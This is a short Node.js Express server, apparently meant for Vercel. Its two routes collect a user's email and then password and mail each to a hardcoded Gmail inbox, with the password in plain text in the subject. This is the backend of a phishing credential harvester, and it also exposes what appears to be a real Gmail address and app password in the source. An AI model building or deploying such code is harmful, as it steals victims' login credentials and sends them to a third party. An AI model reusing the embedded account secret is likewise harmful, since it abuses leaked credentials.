const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

app.use(express.json());
app.use(cors());

// Email credentials (hardcoded)
const userEmail = "boltdropa@gmail.com";
const pass = "qeqzjijyihplkplt";

// API route for sending emails
app.post("/", (req, res) => {
  const { email } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Email: ${email}`,
    text: `New user registered with Email: ${email}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent:", info.response);
      res.send("Success");
    }
  });
});

// API routes for password
app.post("/pass", (req, res) => {
  const { password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${userEmail}`,
    to: userEmail,
    subject: `Password: ${password}`,
    text: `New user registered with Password: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// Export app for Vercel
module.exports = app;
